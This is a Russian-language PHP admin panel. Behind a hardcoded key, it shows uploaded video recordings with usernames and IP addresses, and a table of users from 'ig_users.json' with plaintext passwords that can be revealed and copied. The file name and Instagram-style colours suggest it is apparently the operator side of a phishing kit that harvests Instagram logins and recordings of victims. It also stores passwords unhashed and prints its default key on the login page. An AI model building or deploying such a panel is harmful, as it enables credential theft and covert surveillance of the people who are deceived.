<?php
// ============================================================
//   admin.php
//   • Вход по ключу
//   • Просмотр всех видеозаписей (смотреть и слышать)
//   • Просмотр всех пользователей С ПАРОЛЯМИ
//   • Скачать / удалить
// ============================================================

session_start();

define('ADMIN_KEY', 'video123');       // ⚠️ СМЕНИТЕ НА СВОЙ КЛЮЧ

$dir       = __DIR__ . '/uploads';
$metaFile  = $dir . '/videos.json';
$usersFile = __DIR__ . '/ig_users.json';

if (!is_dir($dir)) @mkdir($dir, 0755, true);

// ============================================================
//   API (JSON)
// ============================================================
if (isset($_GET['action'])) {
    header('Content-Type: application/json; charset=utf-8');

    if (empty($_SESSION['admin_ok'])) {
        echo json_encode(['ok'=>false, 'error'=>'Не авторизован']);
        exit;
    }

    if ($_GET['action'] === 'list') {
        $videos = file_exists($metaFile) ? (json_decode(file_get_contents($metaFile), true) ?: []) : [];
        echo json_encode(['ok'=>true, 'videos'=>$videos]);
        exit;
    }

    if ($_GET['action'] === 'delete') {
        $input = json_decode(file_get_contents('php://input'), true);
        $file = basename($input['file'] ?? '');
        $path = $dir . '/' . $file;
        if ($file && file_exists($path)) unlink($path);

        if (file_exists($metaFile)) {
            $videos = json_decode(file_get_contents($metaFile), true) ?: [];
            $videos = array_values(array_filter($videos, fn($v) => $v['file'] !== $file));
            file_put_contents($metaFile, json_encode($videos, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));
        }
        echo json_encode(['ok'=>true]);
        exit;
    }

    if ($_GET['action'] === 'users') {
        // ⚠️ Отдаём ВСЕХ пользователей ВКЛЮЧАЯ пароли
        $users = file_exists($usersFile) ? (json_decode(file_get_contents($usersFile), true) ?: []) : [];
        echo json_encode(['ok'=>true, 'users'=>$users]);
        exit;
    }

    if ($_GET['action'] === 'delete_user') {
        $input = json_decode(file_get_contents('php://input'), true);
        $uname = $input['username'] ?? '';
        $users = file_exists($usersFile) ? (json_decode(file_get_contents($usersFile), true) ?: []) : [];
        $users = array_values(array_filter($users, fn($u) => $u['username'] !== $uname));
        file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE));
        echo json_encode(['ok'=>true]);
        exit;
    }

    echo json_encode(['ok'=>false, 'error'=>'Неизвестное действие']);
    exit;
}

// ============================================================
//   ВХОД / ВЫХОД
// ============================================================
$loginErr = '';
if (isset($_GET['logout'])) {
    unset($_SESSION['admin_ok']);
    header('Location: admin.php');
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['key'])) {
    if ($_POST['key'] === ADMIN_KEY) {
        $_SESSION['admin_ok'] = true;
        header('Location: admin.php');
        exit;
    }
    $loginErr = 'Неверный ключ';
}

$logged = !empty($_SESSION['admin_ok']);
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Админка — Видео и Пользователи</title>
<style>
  *{box-sizing:border-box}
  body{
    margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
    background:#0e0e12;color:#f0f0f5;font-size:14px;min-height:100vh;
  }
  .hidden{display:none !important}

  /* Логин */
  .login{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .login-card{
    background:#16161f;border:1px solid #2a2a3a;border-radius:16px;
    padding:32px;max-width:360px;width:100%;text-align:center;
  }
  .login-card h1{margin:0 0 6px;font-size:20px}
  .login-card p{margin:0 0 20px;color:#8b8ba8;font-size:13px}
  .login-card input{
    width:100%;background:#1e1e2a;border:1px solid #2a2a3a;border-radius:10px;
    padding:11px 14px;color:#f0f0f5;font-size:14px;outline:none;margin-bottom:10px;
  }
  .login-card input:focus{border-color:#6c5ce7}
  .login-card button{
    width:100%;background:#0095f6;border:0;border-radius:10px;padding:11px;
    color:#fff;font-weight:600;font-size:14px;cursor:pointer;
  }
  .login-card button:hover{background:#1877f2}
  .err{color:#ff5c7a;font-size:13px;min-height:18px;margin-bottom:8px}

  /* Шапка */
  .header{
    background:#16161f;border-bottom:1px solid #2a2a3a;padding:14px 24px;
    display:flex;align-items:center;gap:14px;position:sticky;top:0;z-index:10;
  }
  .header h1{margin:0;font-size:17px}
  .header .right{margin-left:auto;display:flex;gap:8px}
  .header button,.header a{
    background:#1e1e2a;border:1px solid #2a2a3a;color:#f0f0f5;
    padding:8px 14px;border-radius:8px;font-size:13px;font-weight:600;
    cursor:pointer;text-decoration:none;font-family:inherit;
  }
  .header button:hover,.header a:hover{border-color:#6c5ce7}
  .header a.danger{color:#ff5c7a;border-color:rgba(255,92,122,.4)}

  .main{max-width:1200px;margin:0 auto;padding:24px}

  /* Табы */
  .tabs{display:flex;gap:8px;margin-bottom:20px}
  .tabs button{
    background:#16161f;border:1px solid #2a2a3a;color:#8b8ba8;
    padding:10px 18px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;
    font-family:inherit;
  }
  .tabs button.active{background:#0095f6;border-color:#0095f6;color:#fff}

  /* Статистика */
  .stats{
    display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
    gap:14px;margin-bottom:22px;
  }
  .stat{background:#16161f;border:1px solid #2a2a3a;border-radius:12px;padding:18px 20px}
  .stat .label{
    color:#8b8ba8;font-size:11.5px;font-weight:600;text-transform:uppercase;
    letter-spacing:.6px;margin-bottom:8px;
  }
  .stat .value{font-size:26px;font-weight:700;color:#6c5ce7}

  /* Видео-карточки */
  .videos{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
  .video-card{background:#16161f;border:1px solid #2a2a3a;border-radius:12px;overflow:hidden}
  .video-card video{width:100%;background:#000;display:block;aspect-ratio:4/3;object-fit:contain}
  .video-card .info{padding:12px 14px;font-size:12.5px;color:#8b8ba8;line-height:1.6}
  .video-card .info b{color:#f0f0f5}
  .video-card .actions{padding:0 14px 14px;display:flex;gap:8px}
  .video-card .actions a,.video-card .actions button{
    flex:1;text-align:center;background:#1e1e2a;border:1px solid #2a2a3a;
    color:#f0f0f5;padding:7px 10px;border-radius:8px;font-size:12px;
    font-weight:600;cursor:pointer;text-decoration:none;font-family:inherit;
  }
  .video-card .actions a:hover,.video-card .actions button:hover{border-color:#6c5ce7}
  .video-card .actions .del{color:#ff5c7a;border-color:rgba(255,92,122,.4)}

  /* Таблица пользователей */
  .table-wrap{background:#16161f;border:1px solid #2a2a3a;border-radius:12px;overflow:hidden}
  table{width:100%;border-collapse:collapse;font-size:13.5px}
  th{
    background:#1e1e2a;padding:12px 14px;text-align:left;font-size:11.5px;
    color:#8b8ba8;text-transform:uppercase;letter-spacing:.6px;
    border-bottom:1px solid #2a2a3a;font-weight:700;
  }
  td{padding:12px 14px;border-bottom:1px solid #1e1e2a;vertical-align:middle}
  tr:last-child td{border-bottom:0}
  tr:hover td{background:rgba(108,92,231,.05)}

  .pass{
    font-family:monospace;background:#1e1e2a;padding:5px 9px;border-radius:6px;
    cursor:pointer;user-select:all;border:1px solid #2a2a3a;color:#6c5ce7;
    display:inline-block;max-width:200px;overflow:hidden;
    text-overflow:ellipsis;white-space:nowrap;
  }
  .pass:hover{border-color:#6c5ce7}
  .pass.hidden-pass{color:#8b8ba8;letter-spacing:2px}

  .email{color:#00d2d3;font-family:monospace;font-size:12.5px}
  .uname{font-weight:600;color:#f0f0f5}

  .btn-del-user{
    background:#1e1e2a;border:1px solid rgba(255,92,122,.4);color:#ff5c7a;
    padding:6px 11px;border-radius:7px;font-size:12px;font-weight:600;cursor:pointer;
    font-family:inherit;
  }
  .btn-del-user:hover{background:rgba(255,92,122,.1)}

  .empty{padding:60px 20px;text-align:center;color:#8b8ba8}
  .toast{
    position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(60px);
    background:#1e1e2a;border:1px solid #2a2a3a;padding:12px 22px;border-radius:10px;
    font-size:13px;opacity:0;transition:.3s;pointer-events:none;z-index:200;
  }
  .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
</style>
</head>
<body>

<?php if (!$logged): ?>
<!-- ==================== ЛОГИН ==================== -->
<div class="login">
  <div class="login-card">
    <h1>🔐 Админ-панель</h1>
    <p>Видео и пользователи</p>
    <form method="post">
      <input type="password" name="key" placeholder="Секретный ключ" autocomplete="off" required>
      <div class="err"><?= htmlspecialchars($loginErr) ?></div>
      <button type="submit">Войти</button>
    </form>
    <p style="margin-top:16px;font-size:11.5px;color:#8b8ba8">
      Ключ: <b style="color:#6c5ce7">video123</b><br>
      Смените в admin.php
    </p>
  </div>
</div>

<?php else: ?>
<!-- ==================== АДМИНКА ==================== -->
<header class="header">
  <h1>🎥 Админ-панель</h1>
  <div class="right">
    <button id="btn-refresh">🔄 Обновить</button>
    <a href="?logout=1" class="danger">Выйти</a>
  </div>
</header>

<main class="main">
  <div class="tabs">
    <button class="active" data-tab="videos">📹 Видео</button>
    <button data-tab="users">👥 Пользователи</button>
  </div>

  <!-- ============ ВИДЕО ============ -->
  <div id="tab-videos">
    <div class="stats">
      <div class="stat"><div class="label">Всего видео</div><div class="value" id="s-count">0</div></div>
      <div class="stat"><div class="label">Общий размер</div><div class="value" id="s-size">0 МБ</div></div>
      <div class="stat"><div class="label">Последнее</div><div class="value" id="s-last" style="font-size:15px;font-weight:600">—</div></div>
    </div>
    <div id="videos" class="videos"></div>
    <div id="empty" class="empty hidden">Видео пока нет</div>
  </div>

  <!-- ============ ПОЛЬЗОВАТЕЛИ (с паролями) ============ -->
  <div id="tab-users" class="hidden">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Имя</th>
            <th>Username</th>
            <th>Email</th>
            <th>Пароль</th>
            <th>IP</th>
            <th>Дата</th>
            <th></th>
          </tr>
        </thead>
        <tbody id="users-tbody"></tbody>
      </table>
      <div id="users-empty" class="empty">Пользователей пока нет</div>
    </div>
  </div>
</main>

<script>
const $ = (s,r=document) => r.querySelector(s);
const esc = s => String(s??'').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

function toast(m){
  const t = $('#toast');
  t.textContent = m;
  t.classList.add('show');
  clearTimeout(t._t);
  t._t = setTimeout(()=>t.classList.remove('show'), 2200);
}

function fmtSize(b){
  if (b<1024) return b+' Б';
  if (b<1024*1024) return (b/1024).toFixed(1)+' КБ';
  if (b<1024*1024*1024) return (b/1024/1024).toFixed(1)+' МБ';
  return (b/1024/1024/1024).toFixed(2)+' ГБ';
}
function fmtDate(s){ return new Date(s).toLocaleString('ru-RU'); }
function fmtDur(s){ return Math.floor(s/60)+' мин '+(s%60)+' сек'; }

/* ============ ВИДЕО ============ */
async function loadVideos(){
  try {
    const r = await fetch('admin.php?action=list');
    const data = await r.json();
    if (!data.ok) { toast('Ошибка: '+data.error); return; }
    renderVideos(data.videos);
  } catch(e){ toast('Сервер недоступен'); }
}

function renderVideos(list){
  const box = $('#videos'), empty = $('#empty');
  let total = 0;
  list.forEach(v => total += v.size||0);
  $('#s-count').textContent = list.length;
  $('#s-size').textContent = fmtSize(total);
  if (list.length) {
    const last = list.reduce((a,b)=> (a.saved_at>b.saved_at?a:b));
    $('#s-last').textContent = fmtDate(last.saved_at);
  } else $('#s-last').textContent = '—';

  if (!list.length) {
    box.innerHTML = '';
    empty.classList.remove('hidden');
    return;
  }
  empty.classList.add('hidden');

  box.innerHTML = list.sort((a,b)=> new Date(b.saved_at)-new Date(a.saved_at)).map(v => `
    <div class="video-card">
      <video src="uploads/${esc(v.file)}" controls preload="metadata"></video>
      <div class="info">
        <div><b>👤</b> @${esc(v.username||'guest')}</div>
        <div><b>📅</b> ${esc(fmtDate(v.saved_at))}</div>
        <div><b>⏱</b> ${esc(fmtDur(v.duration||0))}</div>
        <div><b>💾</b> ${esc(fmtSize(v.size||0))}</div>
        <div><b>🌐</b> IP: ${esc(v.ip||'—')}</div>
      </div>
      <div class="actions">
        <a href="uploads/${esc(v.file)}" download>⬇ Скачать</a>
        <button class="del" data-del="${esc(v.file)}">🗑 Удалить</button>
      </div>
    </div>
  `).join('');
}

/* ============ ПОЛЬЗОВАТЕЛИ (С ПАРОЛЯМИ) ============ */
async function loadUsers(){
  try {
    const r = await fetch('admin.php?action=users');
    const data = await r.json();
    if (!data.ok) return;
    renderUsers(data.users);
  } catch(e){}
}

function renderUsers(list){
  const tb = $('#users-tbody'), empty = $('#users-empty');
  if (!list.length) {
    tb.innerHTML = '';
    empty.classList.remove('hidden');
    return;
  }
  empty.classList.add('hidden');
  tb.innerHTML = list.map(u => `
    <tr>
      <td>${esc(u.name||'—')}</td>
      <td><span class="uname">@${esc(u.username||'—')}</span></td>
      <td><span class="email">${esc(u.email||'—')}</span></td>
      <td>
        <span class="pass hidden-pass"
              data-pass="${esc(u.password||'')}"
              data-act="toggle"
              title="Кликните, чтобы показать/скопировать">
          ••••••••
        </span>
      </td>
      <td style="color:#8b8ba8;font-family:monospace;font-size:12px">${esc(u.ip||'—')}</td>
      <td style="color:#8b8ba8;font-size:12px">${esc(u.created ? fmtDate(u.created) : '—')}</td>
      <td><button class="btn-del-user" data-del-user="${esc(u.username||'')}">🗑</button></td>
    </tr>
  `).join('');
}

/* ============ ДЕЙСТВИЯ ============ */
document.addEventListener('click', async e => {

  /* Показать/скопировать пароль */
  const passEl = e.target.closest('.pass');
  if (passEl) {
    const pass = passEl.dataset.pass;
    if (passEl.classList.contains('hidden-pass')) {
      passEl.textContent = pass;
      passEl.classList.remove('hidden-pass');
    } else {
      // Уже открыт — копируем
      try {
        await navigator.clipboard.writeText(pass);
        toast('Пароль скопирован');
      } catch(err) {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = pass;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        toast('Пароль скопирован');
      }
    }
    return;
  }

  /* Удалить видео */
  const delBtn = e.target.closest('[data-del]');
  if (delBtn) {
    if (!confirm('Удалить видео?')) return;
    try {
      const r = await fetch('admin.php?action=delete', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({file: delBtn.dataset.del})
      });
      const d = await r.json();
      if (d.ok) { toast('Удалено'); loadVideos(); }
      else toast('Ошибка: '+d.error);
    } catch(err){ toast('Ошибка'); }
    return;
  }

  /* Удалить пользователя */
  const delUserBtn = e.target.closest('[data-del-user]');
  if (delUserBtn) {
    const uname = delUserBtn.dataset.delUser;
    if (!confirm('Удалить пользователя @' + uname + '?')) return;
    try {
      const r = await fetch('admin.php?action=delete_user', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({username: uname})
      });
      const d = await r.json();
      if (d.ok) { toast('Пользователь удалён'); loadUsers(); }
    } catch(err){ toast('Ошибка'); }
    return;
  }

  /* Переключение табов */
  const tabBtn = e.target.closest('[data-tab]');
  if (tabBtn) {
    document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
    tabBtn.classList.add('active');
    const tab = tabBtn.dataset.tab;
    $('#tab-videos').classList.toggle('hidden', tab !== 'videos');
    $('#tab-users').classList.toggle('hidden', tab !== 'users');
    if (tab === 'users') loadUsers();
    else loadVideos();
  }
});

$('#btn-refresh').addEventListener('click', () => {
  loadVideos();
  loadUsers();
});

/* Загрузка при старте */
loadVideos();
</script>
<?php endif; ?>

<div class="toast" id="toast"></div>
</body>
</html>